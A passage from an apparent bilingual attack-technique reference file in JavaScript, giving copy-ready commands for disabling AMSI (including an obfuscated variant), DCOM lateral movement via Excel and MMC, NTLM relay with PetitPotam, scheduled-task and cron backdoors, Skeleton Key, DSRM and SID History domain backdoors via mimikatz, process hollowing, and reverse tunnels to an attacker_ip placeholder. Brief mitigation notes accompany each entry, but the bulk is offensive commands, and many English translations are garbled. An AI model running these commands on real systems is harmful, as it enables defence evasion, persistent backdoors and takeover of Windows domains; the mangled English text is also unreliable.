      mitigation: { zh: '防御措施：1) 服务账户强密码 2) 监控异常票据 3) 定期轮换密码', en: 'Defenses: 1) Strong service account passwords 2) Monitor anomalous tickets 3) Rotate passwords regularly' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'amsi-bypass',
    name: { zh: 'AMSI绕过', en: 'AMSI Bypass' },
    description: { zh: '绕过反恶意软件扫描接口', en: 'Bypass Anti-Malware Scan Interface' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: 'AMSI绕过', en: 'AMSI Bypass' },
    tags: ['amsi', 'bypass', 'evasion'],
    prerequisites: [{ zh: 'PowerShell环境', en: 'PowerShellEnvironment' }, { zh: 'AMSI启用', en: 'AMSIEnable' }],
    execution: [
      {
        title: { zh: '反射绕过', en: 'ReflectionBypass' },
        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        description: { zh: '通过反射禁用AMSI', en: 'throughReflectionDisableAMSI' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'AmsiUtils', explanation: { zh: 'AMSI工具类', en: 'AMSIToolsClass' } , type: 'keyword' },
          { part: 'amsiInitFailed', explanation: { zh: '初始化失败标志', en: 'initializationFailureflag' } , type: 'keyword' },
          { part: 'SetValue($true)', explanation: { zh: '设置为失败', en: 'Set is Failure' } , type: 'value' }
        ]
      },
      {
        title: { zh: '内存修补', en: 'Memory Patching' },
        command: '$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}',
        description: { zh: '混淆版本绕过', en: 'ObfuscationVersionBypass' },
        platform: 'windows'
      },
      {
        title: { zh: 'DLL劫持', en: 'DLL Hijacking' },
        command: '替换或劫持amsi.dll',
        description: { zh: '通过DLL劫持绕过', en: 'throughDLL HijackingBypass' },
        platform: 'windows'
      },
      {
        title: { zh: '使用工具', en: 'UseTools' },
        command: 'Import-Module .\\AmsiBypass.ps1\nInvoke-AmsiBypass',
        description: { zh: '使用现成工具', en: 'Use Off-the-Shelf Tools' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'AMSI是Windows的安全特性，可被多种方法绕过。', en: 'AMSI is Windows SecurityFeature, Can by MultipleMethodBypass.' },
      vulnerability: { zh: 'AMSI实现存在缺陷。', en: 'The AMSI implementation has flaws.' },
      exploitation: { zh: '利用流程：1) 检测AMSI 2) 选择绕过方法 3) 执行恶意代码', en: 'Exploitation workflow: 1) Detect AMSI 2) Choose bypass method 3) Execute malicious code' },
      mitigation: { zh: '防御措施：1) 更新AMSI 2) 监控内存修改 3) 多层防护', en: 'Defenses: 1) Update AMSI 2) Monitor memory modifications 3) Defense in depth' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lateral-dcom-excel',
    name: { zh: 'Excel DCOM横向移动', en: 'Excel DCOM Lateral Movement' },
    description: { zh: '利用Excel DCOM进行横向移动', en: 'ExploitationExcel DCOM perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'DCOM',
    tags: ['dcom', 'excel', 'lateral'],
    prerequisites: [{ zh: '目标安装Excel', en: 'TargetInstallationExcel' }, { zh: 'DCOM权限', en: 'DCOMPermission' }],
    execution: [
      {
        title: { zh: 'Excel DCOM激活', en: 'Excel DCOMActivate' },
        command: '$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Visible = $false',
        description: { zh: '激活Excel DCOM对象', en: 'ActivateExcel DCOM for Object' },
        platform: 'windows'
      },
      {
        title: { zh: '执行命令', en: 'Execute Command' },
        command: '$obj.Workbooks.Add()\n$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"\n$obj.Run("calc.exe")',
        description: { zh: '通过Excel执行命令', en: 'throughExcelExecute Command' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Excel.Application', explanation: { zh: 'Excel COM对象', en: 'Excel COM for Object' } , type: 'keyword' },
          { part: '=CMD|/C', explanation: { zh: 'DDE命令注入', en: 'DDECommand Injection' } , type: 'keyword' }
        ]
      },
      {
        title: 'Impacket DCOM',
        command: 'python dcomexec.py -object Excel.Application domain/user:password@target.com',
        description: { zh: '使用Impacket执行', en: 'UseImpacketExecute' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Excel DCOM可用于远程命令执行。', en: 'Excel DCOMCan used for RemoteCommand Execution.' },
      vulnerability: { zh: 'Excel DCOM对象允许远程访问。', en: 'Excel DCOM for ObjectAllowRemoteAccess.' },
      exploitation: { zh: '利用流程：1) 激活DCOM对象 2) 注入命令 3) 执行', en: 'Exploitationworkflow: 1) ActivateDCOM for Object 2) InjectionCommand 3) Execute' },
      mitigation: { zh: '防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动', en: 'Defenses: 1) Disable DCOM 2) Restrict remote access 3) Monitor DCOM activity' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'lateral-dcom-mmc',
    name: { zh: 'MMC DCOM横向移动', en: 'MMC DCOM Lateral Movement' },
    description: { zh: '利用MMC DCOM进行横向移动', en: 'ExploitationMMC DCOM perform Lateral Movement' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'DCOM',
    tags: ['dcom', 'mmc', 'lateral'],
    prerequisites: [{ zh: '目标安装MMC', en: 'TargetInstallationMMC' }, { zh: 'DCOM权限', en: 'DCOMPermission' }],
    execution: [
      {
        title: 'MMC20.Application',
        command: '$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")',
        description: { zh: '使用MMC执行命令', en: 'UseMMCExecute Command' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'MMC20.Application', explanation: { zh: 'MMC COM对象', en: 'MMC COM for Object' } , type: 'value' },
          { part: 'ExecuteShellCommand', explanation: { zh: '执行Shell命令方法', en: 'ExecuteShellCommandMethod' } , type: 'function' }
        ]
      },
      {
        title: { zh: 'Impacket执行', en: 'ImpacketExecute' },
        command: 'python dcomexec.py -object MMC20.Application domain/user:password@target.com',
        description: { zh: '使用Impacket', en: 'UseImpacket' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'MMC DCOM可用于远程命令执行。', en: 'MMC DCOMCan used for RemoteCommand Execution.' },
      vulnerability: { zh: 'MMC DCOM对象允许远程访问。', en: 'MMC DCOM for ObjectAllowRemoteAccess.' },
      exploitation: { zh: '利用流程：1) 激活MMC DCOM 2) 调用ExecuteShellCommand 3) 执行命令', en: 'Exploitationworkflow: 1) ActivateMMC DCOM 2) CallExecuteShellCommand 3) Execute Command' },
      mitigation: { zh: '防御措施：1) 禁用DCOM 2) 限制远程访问 3) 监控DCOM活动', en: 'Defenses: 1) Disable DCOM 2) Restrict remote access 3) Monitor DCOM activity' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'rdp-relay',
    name: { zh: 'RDP Relay攻击', en: 'RDP Relay Attack' },
    description: { zh: 'RDP中继攻击技术', en: 'RDPRelayAttackTechnique' },
    category: { zh: '横向移动', en: 'Lateral Movement' },
    subCategory: 'RDP',
    tags: ['rdp', 'relay', 'lateral'],
    prerequisites: [{ zh: 'RDP服务可访问', en: 'RDPServiceCanAccess' }, { zh: '存在NTLM认证', en: 'hasNTLMAuthentication' }],
    execution: [
      {
        title: { zh: '设置中继', en: 'SetRelay' },
        command: '使用Impacket:\npython ntlmrelayx.py -tf targets.txt -smb2support\n或使用rdp_relay.py',
        description: { zh: '设置RDP中继服务器', en: 'SetRDPRelayServer' },
        platform: 'linux'
      },
      {
        title: { zh: '诱导连接', en: 'Coerced Connection' },
        command: '诱导用户连接到攻击者控制的RDP服务器:\n1. 发送恶意RDP文件\n2. 用户连接时中继到目标',
        description: { zh: '诱导用户连接', en: 'Coerce User Connection' },
        platform: 'all'
      },
      {
        title: { zh: 'PetitPotam组合', en: 'PetitPotamGroupsCombine' },
        command: 'python petitpotam.py -d domain -u user -p pass attacker_ip target_ip\n结合NTLM中继攻击ADCS',
        description: 'PetitPotam + RDP Relay',
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'RDP Relay利用NTLM认证中继攻击。', en: 'RDP RelayExploitationNTLMAuthenticationRelayAttack.' },
      vulnerability: { zh: 'RDP使用NTLM认证，可被中继。', en: 'RDPUseNTLMAuthentication, Can by Relay.' },
      exploitation: { zh: '利用流程：1) 设置中继服务器 2) 诱导连接 3) 中继认证', en: 'Exploitation workflow: 1) Set up relay server 2) Coerce connection 3) Relay authentication' },
      mitigation: { zh: '防御措施：1) 启用Kerberos 2) 启用CredSSP 3) 网络隔离', en: 'Defensemeasures: 1) EnableKerberos 2) EnableCredSSP 3) NetworkIsolation' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'persistence-scheduled',
    name: { zh: '计划任务持久化', en: 'Scheduled Task Persistence' },
    description: { zh: '通过计划任务实现持久化', en: 'Achieve Persistence Through Scheduled Tasks' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '计划任务', en: 'Scheduled task' },
    tags: ['persistence', 'scheduled', 'task'],
    prerequisites: [{ zh: '创建任务权限', en: 'CreatetaskPermission' }],
    execution: [
      {
        title: { zh: '创建登录任务', en: 'CreateLogintask' },
        command: 'schtasks /create /tn "Backdoor" /tr "C:\\backdoor.exe" /sc onlogon /ru SYSTEM',
        description: { zh: '创建登录时运行的任务', en: 'CreateLoginWhenRun task' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/tn', explanation: { zh: '任务名称', en: 'Task name' } , type: 'parameter' },
          { part: '/tr', explanation: { zh: '执行的程序', en: 'Execute Program' } , type: 'parameter' },
          { part: '/sc onlogon', explanation: { zh: '触发条件：登录时', en: 'TriggerCondition: LoginWhen' } , type: 'parameter' },
          { part: '/ru SYSTEM', explanation: { zh: '运行用户：SYSTEM', en: 'RunUsers: SYSTEM' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '创建定时任务', en: 'Create Timed Task' },
        command: 'schtasks /create /tn "Backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 5',
        description: { zh: '创建每5分钟运行的任务', en: 'Create a Task Running Every 5 Minutes' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerShell创建', en: 'PowerShellCreate' },
        command: '$action = New-ScheduledTaskAction -Execute "C:\\backdoor.exe"\n$trigger = New-ScheduledTaskTrigger -AtLogon\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"',
        description: { zh: '使用PowerShell创建任务', en: 'UsePowerShellCreatetask' },
        platform: 'windows'
      },
      {
        title: 'Linux Cron',
        command: 'crontab -e\n添加: * * * * * /tmp/backdoor.sh\n或: @reboot /tmp/backdoor.sh',
        description: { zh: 'Linux计划任务', en: 'Linux Scheduled Task' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: '计划任务是常用的持久化方式。', en: 'Scheduled tasks are a common persistence method.' },
      vulnerability: { zh: '计划任务可被创建执行任意程序。', en: 'Scheduled tasks can be created to execute arbitrary programs.' },
      exploitation: { zh: '利用流程：1) 创建任务 2) 设置触发器 3) 等待执行', en: 'Exploitationworkflow: 1) Createtask 2) SetTriggerTool 3) waitingExecute' },
      mitigation: { zh: '防御措施：1) 监控任务创建 2) 审计任务变更 3) 限制创建权限', en: 'Defenses: 1) Monitor task creation 2) Audit task changes 3) Restrict creation permissions' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'skeleton-key',
    name: { zh: 'Skeleton Key后门', en: 'Skeleton Key Backdoor' },
    description: { zh: '在域控制器植入万能密码', en: 'Implant Skeleton Key on Domain Controller' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '域后门', en: 'Domain Backdoor' },
    tags: ['skeleton-key', 'backdoor', 'domain'],
    prerequisites: [{ zh: '域管理员权限', en: 'Domain AdminsPermission' }, { zh: '访问域控制器', en: 'AccessDomainController' }],
    execution: [
      {
        title: { zh: '植入Skeleton Key', en: 'Implant Skeleton Key' },
        command: 'mimikatz # privilege::debug\nmimikatz # misc::skeleton',
        description: { zh: '使用Mimikatz植入', en: 'Implant Using Mimikatz' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'misc::skeleton', explanation: { zh: '植入万能密码模块', en: 'Implant Master Password Module' } , type: 'command' }
        ]
      },
      {
        title: { zh: '使用万能密码', en: 'Use Skeleton Key Password' },
        command: '万能密码: mimikatz\n任何域用户都可以使用mimikatz作为密码登录',
        description: { zh: '使用万能密码登录', en: 'Log In with Skeleton Key Password' },
        platform: 'windows'
      },
      {
        title: { zh: '检测方法', en: 'DetectionMethod' },
        command: '检查LSASS内存:\nGet-Process lsass\n使用EDR检测内存注入',
        description: { zh: '检测Skeleton Key', en: 'DetectionSkeleton Key' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'Skeleton Key在内存中植入万能密码，不影响原密码。', en: 'Skeleton Key implants a master password in memory without affecting original passwords.' },
      vulnerability: { zh: '域控制器LSASS可被注入。', en: 'DomainControllerLSASSCan by Injection.' },
      exploitation: { zh: '利用流程：1) 获取域管权限 2) 访问DC 3) 植入后门', en: 'Exploitation workflow: 1) Obtain Domain Admin privileges 2) Access the DC 3) Implant backdoor' },
      mitigation: { zh: '防御措施：1) 保护DC 2) 监控LSASS 3) 使用Credential Guard', en: 'Defenses: 1) Protect the DC 2) Monitor LSASS 3) Use Credential Guard' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'dsrm-backdoor',
    name: { zh: 'DSRM后门', en: 'DSRM Backdoor' },
    description: { zh: '利用DSRM账户建立后门', en: 'Exploit DSRM Account to Establish Backdoor' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '域后门', en: 'Domain Backdoor' },
    tags: ['dsrm', 'backdoor', 'domain'],
    prerequisites: [{ zh: '域管理员权限', en: 'Domain AdminsPermission' }, { zh: '访问域控制器', en: 'AccessDomainController' }],
    execution: [
      {
        title: { zh: '获取DSRM密码', en: 'ObtainDSRMPassword' },
        command: 'mimikatz # lsadump::lsa /patch /name:krbtgt\n或\nmimikatz # token::elevate\nmimikatz # lsadump::sam',
        description: { zh: '获取DSRM账户哈希', en: 'ObtainDSRMAccounthash' },
        platform: 'windows'
      },
      {
        title: { zh: '同步DSRM密码', en: 'SamestepDSRMPassword' },
        command: 'ntdsutil\nset dsrm password\nsync from domain account admin\nq\nq',
        description: { zh: '同步DSRM密码与域管理员', en: 'SamestepDSRMPassword and Domain Admins' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'ntdsutil', explanation: { zh: 'AD数据库工具', en: 'ADDatabaseTools' } , type: 'command' },
          { part: 'sync from domain account', explanation: { zh: '同步域账户密码', en: 'SamestepDomainAccountPassword' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '启用DSRM账户', en: 'EnableDSRMAccount' },
        command: '修改注册表:\nNew-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD',
        description: { zh: '允许DSRM账户远程登录', en: 'AllowDSRMAccountRemoteLogin' },
        platform: 'windows'
      },
      {
        title: { zh: '使用DSRM登录', en: 'UseDSRMLogin' },
        command: '使用DSRM账户哈希:\nmimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH\n或使用Pass-the-Hash',
        description: { zh: '使用DSRM账户', en: 'UseDSRMAccount' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DSRM是域控制器的本地管理员账户，可作为后门使用。', en: 'DSRM is the Domain Controller local admin account and can be used as a backdoor.' },
      vulnerability: { zh: 'DSRM账户独立于域账户，常被忽视。', en: 'The DSRM account is independent of domain accounts and is often overlooked.' },
      exploitation: { zh: '利用流程：1) 获取DSRM哈希 2) 同步密码 3) 启用远程登录', en: 'Exploitationworkflow: 1) ObtainDSRMhash 2) SamestepPassword 3) EnableRemoteLogin' },
      mitigation: { zh: '防御措施：1) 监控DSRM密码变更 2) 检查注册表 3) 定期审计', en: 'Defenses: 1) Monitor DSRM password changes 2) Check registry 3) Regular audits' },
      difficulty: 'expert'
    }
  },
  {
    id: 'sid-history',
    name: { zh: 'SID History后门', en: 'SID History Backdoor' },
    description: { zh: '利用SID History建立后门', en: 'Exploit SID History to Establish Backdoor' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '域后门', en: 'Domain Backdoor' },
    tags: ['sid-history', 'backdoor', 'domain'],
    prerequisites: [{ zh: '域管理员权限', en: 'Domain AdminsPermission' }],
    execution: [
      {
        title: { zh: '添加SID History', en: 'AddSID History' },
        command: 'mimikatz # sid::add /sam:backdoor_user /new:administrator\n将域管SID添加到普通用户',
        description: { zh: '添加SID History', en: 'AddSID History' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'sid::add', explanation: { zh: '添加SID History', en: 'AddSID History' } , type: 'command' },
          { part: '/sam', explanation: { zh: '目标用户', en: 'TargetUsers' } , type: 'parameter' },
          { part: '/new', explanation: { zh: '要添加的SID', en: 'NeedAdd SID' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '验证SID History', en: 'VerifySID History' },
        command: 'Get-ADUser backdoor_user -Properties sidHistory\n或\nwhoami /all',
        description: { zh: '检查SID History', en: 'CheckSID History' },
        platform: 'windows'
      },
      {
        title: { zh: '使用后门', en: 'Use Backdoor' },
        command: '使用backdoor_user登录\n自动获得域管理员权限',
        description: { zh: '使用后门账户', en: 'Use Backdoor Account' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'SID History允许用户继承其他用户的权限。', en: 'SID History allows users to inherit permissions from other users.' },
      vulnerability: { zh: 'SID History可被滥用添加额外权限。', en: 'SID History can be abused to add extra privileges.' },
      exploitation: { zh: '利用流程：1) 创建普通用户 2) 添加域管SID 3) 获得域管权限', en: 'Exploitation workflow: 1) Create a regular user 2) Add Domain Admin SID 3) Gain Domain Admin privileges' },
      mitigation: { zh: '防御措施：1) 监控SID History 2) 审计用户属性 3) 使用PAM', en: 'Defensemeasures: 1) MonitoringSID History 2) AuditUsersproperty 3) UsePAM' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'persistence-process-hollowing',
    name: { zh: '进程镂空持久化', en: 'Process Hollowing Persistence' },
    description: { zh: '利用进程镂空技术实现持久化', en: 'Achieve Persistence via Process Hollowing' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '进程注入', en: 'Process Injection' },
    tags: ['process-hollowing', 'persistence', 'injection'],
    prerequisites: [{ zh: '代码执行权限', en: 'CodeExecutePermission' }],
    execution: [
      {
        title: { zh: '进程镂空原理', en: 'Process Hollowing Principles' },
        command: '1. 创建合法进程(挂起状态)\n2. 替换进程内存\n3. 恢复执行',
        description: { zh: '进程镂空原理', en: 'Process Hollowing Principles' },
        platform: 'windows'
      },
      {
        title: { zh: 'C#实现', en: 'C# implementation' },
        command: 'using System.Runtime.InteropServices;\n// 创建挂起进程\nCreateProcess("C:\\\\Windows\\\\System32\\\\svchost.exe", ..., CREATE_SUSPENDED, ...);\n// 替换内存\nNtUnmapViewOfSection(...);\nVirtualAllocEx(...);\nWriteProcessMemory(...);\nResumeThread(...);',
        description: { zh: 'C#进程镂空', en: 'C# Process Hollowing' },
        platform: 'windows'
      },
      {
        title: { zh: '检测方法', en: 'DetectionMethod' },
        command: '检查进程内存:\n- 进程路径与内存内容不匹配\n- 异常的内存区域\n- 使用EDR检测',
        description: { zh: '检测进程镂空', en: 'Detect Process Hollowing' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '进程镂空将恶意代码注入合法进程。', en: 'Process hollowing injects malicious code into legitimate processes.' },
      vulnerability: { zh: 'Windows进程创建机制可被利用。', en: 'WindowsProcessCreateMechanismCan by Exploitation.' },
      exploitation: { zh: '利用流程：1) 创建挂起进程 2) 替换内存 3) 恢复执行', en: 'Exploitation workflow: 1) Create a suspended process 2) Replace memory 3) Resume execution' },
      mitigation: { zh: '防御措施：1) 使用EDR 2) 监控进程创建 3) 内存扫描', en: 'Defensemeasures: 1) UseEDR 2) MonitoringProcessCreate 3) MemoryScan' },
      difficulty: 'expert'
    }
  },
  {
    id: 'socks-proxy',
    name: { zh: 'SOCKS代理', en: 'SOCKS Proxy' },
    description: { zh: '建立SOCKS代理访问内网', en: 'EstablishSOCKS ProxyAccessInternal network' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'SOCKS',
    tags: ['socks', 'proxy', 'tunnel'],
    prerequisites: [{ zh: '已有内网访问点', en: 'already has Internal networkAccesspoint' }],
    execution: [
      {
        title: { zh: 'SSH SOCKS代理', en: 'SSH SOCKS Proxy' },
        command: 'ssh -D 1080 user@jumpserver\n或\nssh -D 1080 -N -f user@jumpserver',
        description: { zh: 'SSH动态端口转发', en: 'SSH Dynamic Port Forwarding' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-D 1080', explanation: { zh: '本地SOCKS代理端口', en: 'LocalSOCKS ProxyPort' } , type: 'parameter' },
          { part: '-N', explanation: { zh: '不执行远程命令', en: 'not ExecuteRemoteCommand' } , type: 'parameter' },
          { part: '-f', explanation: { zh: '后台运行', en: 'Run in Background' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: 'ProxyChains配置', en: 'ProxyChainsConfiguration' },
        command: '编辑 /etc/proxychains.conf:\n[ProxyList]\nsocks5 127.0.0.1 1080\n\n使用:\nproxychains nmap -sT target',
        description: { zh: '配置ProxyChains', en: 'ConfigurationProxyChains' },
        platform: 'linux'
      },
      {
        title: 'Cobalt Strike SOCKS',
        command: 'beacon> socks 1080\n在CS中启动SOCKS代理',
        description: { zh: 'CS SOCKS代理', en: 'CS SOCKS Proxy' },
        platform: 'windows'
      },
      {
        title: 'Metasploit SOCKS',
        command: 'use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 4a\nrun',
        description: { zh: 'MSF SOCKS代理', en: 'MSF SOCKS Proxy' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'SOCKS代理可穿透内网访问更多资源。', en: 'A SOCKS proxy can tunnel into the internal network to access more resources.' },
      vulnerability: { zh: '存在可访问的内网入口点。', en: 'An accessible intranet entry point exists.' },
      exploitation: { zh: '利用流程：1) 获取跳板机 2) 建立SOCKS代理 3) 访问内网', en: 'Exploitation workflow: 1) Obtain a pivot host 2) Establish SOCKS proxy 3) Access internal network' },
      mitigation: { zh: '防御措施：1) 网络隔离 2) 监控异常连接 3) 限制出站流量', en: 'Defenses: 1) Network segmentation 2) Monitor anomalous connections 3) Restrict outbound traffic' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-ngrok',
    name: { zh: 'Ngrok内网穿透', en: 'Ngrok Intranet Tunneling' },
    description: { zh: '使用Ngrok建立内网穿透', en: 'UseNgrokEstablishInternal network tunneling' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'Ngrok',
    tags: ['ngrok', 'tunnel', 'penetration'],
    prerequisites: [{ zh: 'Ngrok账号', en: 'Ngrok Account' }, { zh: '可访问外网', en: 'Can access the internet' }],
    execution: [
      {
        title: { zh: '安装Ngrok', en: 'InstallationNgrok' },
        command: '下载: https://ngrok.com/download\ntar -xvzf ngrok.zip\n./ngrok authtoken YOUR_TOKEN',
        description: { zh: '安装并配置Ngrok', en: 'Installation and ConfigurationNgrok' },
        platform: 'all'
      },
      {
        title: { zh: 'HTTP隧道', en: 'HTTP Tunnel' },
        command: './ngrok http 80\n将本地80端口映射到公网',
        description: { zh: '创建HTTP隧道', en: 'CreateHTTP Tunnel' },
        platform: 'all'
      },
      {
        title: { zh: 'TCP隧道', en: 'TCP Tunnel' },
        command: './ngrok tcp 3389\n将本地3389端口映射到公网',
        description: { zh: '创建TCP隧道', en: 'CreateTCP Tunnel' },
        platform: 'all',
        syntaxBreakdown: [
          { part: 'http', explanation: { zh: 'HTTP协议隧道', en: 'HTTPProtocoltunnel' } , type: 'keyword' },
          { part: 'tcp', explanation: { zh: 'TCP协议隧道', en: 'TCPProtocoltunnel' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '自定义域名', en: 'CustomDomain name' },
        command: './ngrok http -hostname=custom.domain.com 80',
        description: { zh: '使用自定义域名', en: 'UseCustomDomain name' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'Ngrok可将内网服务暴露到公网。', en: 'Ngrok can expose internal network services to the public internet.' },
      vulnerability: { zh: '内网可访问外网。', en: 'The internal network can reach the internet.' },
      exploitation: { zh: '利用流程：1) 安装Ngrok 2) 创建隧道 3) 访问内网服务', en: 'Exploitationworkflow: 1) InstallationNgrok 2) Createtunnel 3) AccessInternal networkService' },
      mitigation: { zh: '防御措施：1) 监控出站连接 2) 限制Ngrok域名 3) 网络隔离', en: 'Defenses: 1) Monitor outbound connections 2) Block Ngrok domains 3) Network segmentation' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'tunnel-ew',
    name: { zh: 'EW内网穿透', en: 'EW Intranet Tunneling' },
    description: { zh: '使用EW建立内网穿透', en: 'UseEWEstablishInternal network tunneling' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'EW',
    tags: ['ew', 'tunnel', 'socks'],
    prerequisites: [{ zh: '已有内网访问点', en: 'already has Internal networkAccesspoint' }],
    execution: [
      {
        title: { zh: '正向代理', en: 'Forward Proxy' },
        command: './ew -s ssocksd -l 1080\n在跳板机上启动SOCKS代理',
        description: { zh: '正向SOCKS代理', en: 'Forward SOCKS Proxy' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-s ssocksd', explanation: { zh: 'SOCKS服务模式', en: 'SOCKSServiceMode' } , type: 'parameter' },
          { part: '-l 1080', explanation: { zh: '监听端口', en: 'listeningPort' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '反向代理', en: 'Reverse Proxy' },
        command: '攻击机: ./ew -s rcsocks -l 1080 -e 8888\n跳板机: ./ew -s rssocks -d attacker_ip -e 8888',
        description: { zh: '反向SOCKS代理', en: 'Reverse SOCKS Proxy' },
        platform: 'linux'
      },
      {
        title: { zh: '多级级联', en: 'Multi-level cascading' },
        command: './ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999\n多级跳板穿透',
        description: { zh: '多级级联', en: 'Multi-level cascading' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'EW是轻量级的内网穿透工具。', en: 'EW is a lightweight intranet tunneling tool.' },
      vulnerability: { zh: '存在可访问的内网跳板。', en: 'An accessible intranet pivot point exists.' },
      exploitation: { zh: '利用流程：1) 上传EW 2) 建立隧道 3) 访问内网', en: 'Exploitationworkflow: 1) UploadEW 2) Establishtunnel 3) AccessInternal network' },
      mitigation: { zh: '防御措施：1) 监控异常进程 2) 网络隔离 3) 限制出站', en: 'Defenses: 1) Monitor anomalous processes 2) Network segmentation 3) Restrict outbound traffic' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'tunnel-venom',
    name: { zh: 'Venom内网穿透', en: 'Venom Intranet Tunneling' },
    description: { zh: '使用Venom建立内网穿透', en: 'UseVenomEstablishInternal network tunneling' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: 'Venom',
    tags: ['venom', 'tunnel', 'socks'],
    prerequisites: [{ zh: '已有内网访问点', en: 'already has Internal networkAccesspoint' }],
    execution: [
      {
        title: { zh: '启动服务端', en: 'Start the server side' },
        command: './venom_server -lport 9999\n在攻击机启动服务端',
        description: { zh: '启动服务端', en: 'Start the server side' },
        platform: 'linux'
      },
      {
        title: { zh: '连接客户端', en: 'ConnectionClient' },
        command: './venom_client -rhost attacker_ip -rport 9999\n在跳板机连接服务端',
        description: { zh: '连接服务端', en: 'ConnectionServer-Side' },
        platform: 'all',
        syntaxBreakdown: [
          { part: '-rhost', explanation: { zh: '服务端IP', en: 'Server-SideIP' } , type: 'parameter' },
          { part: '-rport', explanation: { zh: '服务端端口', en: 'Server-SidePort' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '建立SOCKS', en: 'EstablishSOCKS' },
        command: ' Venom > socks 1080\n建立SOCKS代理',
        description: { zh: '建立SOCKS代理', en: 'EstablishSOCKS Proxy' },
        platform: 'all'
      },
      {
        title: { zh: '端口转发', en: 'Port Forwarding' },
        command: 'Venom > lforward 127.0.0.1 3389 13389\n将内网3389转发到本地13389',
        description: { zh: '端口转发', en: 'Port Forwarding' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'Venom支持多级代理和SOCKS。', en: 'Venom supports multi-level proxies and SOCKS.' },
      vulnerability: { zh: '存在可访问的内网跳板。', en: 'An accessible intranet pivot point exists.' },
      exploitation: { zh: '利用流程：1) 启动服务端 2) 连接客户端 3) 建立代理', en: 'Exploitation workflow: 1) Start server 2) Connect client 3) Establish proxy' },
      mitigation: { zh: '防御措施：1) 监控异常进程 2) 网络隔离 3) 限制出站', en: 'Defenses: 1) Monitor anomalous processes 2) Network segmentation 3) Restrict outbound traffic' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'zerologon',
    name: { zh: 'Zerologon攻击', en: 'Zerologon Attack' },
    description: { zh: 'CVE-2020-1472 Netlogon提权', en: 'CVE-2020-1472 NetlogonPrivilege escalation' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'Zerologon',
    tags: ['zerologon', 'cve-2020-1472', 'domain'],
